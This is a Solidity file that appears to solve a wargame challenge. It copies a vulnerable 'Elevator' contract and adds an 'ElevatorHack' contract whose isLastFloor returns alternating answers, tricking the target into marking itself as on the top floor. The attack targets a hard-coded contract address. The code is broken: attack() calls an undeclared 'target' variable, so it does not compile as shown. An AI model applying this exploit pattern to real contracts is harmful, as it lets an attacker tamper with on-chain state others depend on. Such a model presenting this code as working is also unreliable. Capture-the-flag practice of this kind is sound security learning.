pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) { 
      floor = _floor;
      top = building.isLastFloor(floor);     }
  }
}

contract ElevatorHack {

  address instance = 0xf7103107aD630D47E2b8e6A13641c6df18133720;
  Elevator public elevatorattack;
  bool result = true;
  function isLastFloor(uint) public returns (bool){
   
    if(result == true)
    {
      
      result = false;
    }
    else {
     
      result = true;
    }
    return result;
  }

  function attack() public { 
    target.goTo(15); 
    
  }

  constructor() {
    elevatorattack = Elevator(instance);
  }
}
